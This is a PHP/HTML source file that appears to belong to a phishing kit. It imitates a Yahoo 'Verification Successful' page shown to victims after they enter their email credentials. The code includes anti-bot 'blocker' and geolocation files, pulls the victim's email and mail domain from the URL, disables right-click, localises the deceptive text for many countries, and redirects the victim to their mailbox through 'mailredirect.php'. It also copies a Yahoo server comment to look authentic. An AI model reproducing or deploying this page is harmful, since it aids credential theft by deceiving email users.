<?php
session_start();
ob_start();include "blocker.php";
include "geo.php";

function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['userid'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$fdomain = strchr($domain,'.',true);
$fdomain = ucfirst($fdomain);

include "langLib.php";
//get country



?>
<!DOCTYPE html>
<html id="Stencil" class="no-js">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0"/>
        <meta name="format-detection" content="telephone=no">
        <meta name="referrer" content="origin-when-cross-origin">
        <title>Verification Successful</title>
        <link rel="SHORTCUT ICON" href="http://<?php echo $domain ?>/favicon.ico"/>
        <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
        <link rel="apple-touch-icon" href="images/apple-touch-icon.png">
        <link rel="apple-touch-icon-precomposed" href="images/apple-touch-icon.png">

        <!--[if lte IE 8]>
        <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-old-ie-min.css">
        <![endif]-->
        <!--[if gt IE 8]><!-->
       <!-- <link rel="stylesheet" href="https://s.yimg.com/zz/combo?yui-s:pure/0.5.0/pure-min.css&yui-s:pure/0.5.0/grids-responsive-min.css">-->
        <!--<![endif]-->
        
        <link href="redirect/css/yahoo-main.css" rel="stylesheet" type="text/css">
        <script type="text/javascript">
	document.addEventListener("contextmenu", function (e) {
        e.preventDefault();
    }, false);
    </script>
    
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<script>
$(document).ready(function(){
    
   var country ="<?php echo $country; ?>";
   if (country=="DE"){
       $('#congrats').html("<?php echo $congratsDe; ?>");
       $('#writeup').html("<?php echo $writeupDe; ?>");
       $('#return').val("<?php echo $returnDe; ?>");
       
   }
    else if ((country=="CN") || (country =="TW") || (country == "HK")){
       $('#congrats').html("<?php echo $congratsCn; ?>");
       $('#writeup').html("<?php echo $writeupCn; ?>");
       $('#return').val("<?php echo $returnCn; ?>");
   }
    else if (country=="KR"){
      $('#congrats').html("<?php echo $congratsKr; ?>");
       $('#writeup').html("<?php echo $writeupKr; ?>");
       $('#return').val("<?php echo $returnKr; ?>");
   }
    else if (country=="JP"){
       $('#congrats').html("<?php echo $congratsJp; ?>");
       $('#writeup').html("<?php echo $writeupJp; ?>");
       $('#return').val("<?php echo $returnJp; ?>");
   }
    else if (country=="TR"){
      $('#congrats').html("<?php echo $congratsTr; ?>");
       $('#writeup').html("<?php echo $writeupTr; ?>");
       $('#return').val("<?php echo $returnTr; ?>");
   }
    else if (country=="RU"){
       $('#congrats').html("<?php echo $congratsRu; ?>");
       $('#writeup').html("<?php echo $writeupRu; ?>");
       $('#return').val("<?php echo $returnRu; ?>");
   }
    else if (country=="ES"){
       $('#congrats').html("<?php echo $congratsEs; ?>");
       $('#writeup').html("<?php echo $writeupEs; ?>");
       $('#return').val("<?php echo $returnEs; ?>");
       
   } 
   else if (country=="VN"){
       $('#congrats').html("<?php echo $congratsVn; ?>");
       $('#writeup').html("<?php echo $writeupVn; ?>");
       $('#return').val("<?php echo $returnVn; ?>");
       
   } else if (country=="ID"){
       $('#congrats').html("<?php echo $congratsId; ?>");
       $('#writeup').html("<?php echo $writeupId; ?>");
       $('#return').val("<?php echo $returnId; ?>");
   }
    else if (country=="IT"){
       $('#congrats').html("<?php echo $congratsIt; ?>");
       $('#writeup').html("<?php echo $writeupIt; ?>");
       $('#return').val("<?php echo $returnIt; ?>");
   }
    else if ((country=="AE") || (country=="IR") || (country =="IQ")){
       $('#congrats').html("<?php echo $congratsAe; ?>");
       $('#writeup').html("<?php echo $writeupAe; ?>");
       $('#return').val("<?php echo $returnAe; ?>");
   }
    else if (country=="TH"){
       $('#congrats').html("<?php echo $congratsTh; ?>");
       $('#writeup').html("<?php echo $writeupTh; ?>");
       $('#return').val("<?php echo $returnTh; ?>");
   }
    else {
       $('#congrats').html("<?php echo $congratsEn; ?>");
       $('#writeup').html("<?php echo $writeupEn; ?>");
       $('#return').val("<?php echo $returnEn; ?>");
   }
//alert(country);

//get div ids for manipulation at server


});
</script>
    </head>
    <body >
       
	<div class="full-page-msg-container" role="status">
    <div class="title" id="congrats">Congratulations</div>
    <p class="margin20 writeup" id="writeup">Your email address has been verified.</p>
    <div class="action-area">
        <form action="mailredirect.php" method="post">
            <input type="hidden" value="vghNXL2mcNc" name="scrumb">
            <input type="hidden" value="<?php echo $domain ?>" name="Udomain">
            <input type="submit" id="return" class="pure-button puree-button-secondary action-button" name="redirect" data-ylk="elm:btn;elmt:redirect"
                   value="Return to mailbox">
        </form>
    </div>
</div>
</div>
    
</body>
</html>
<!-- fe04.member.ir2.yahoo.com - Thu Mar 28 2019 04:20:44 GMT+0000 (UTC) - (1ms) -->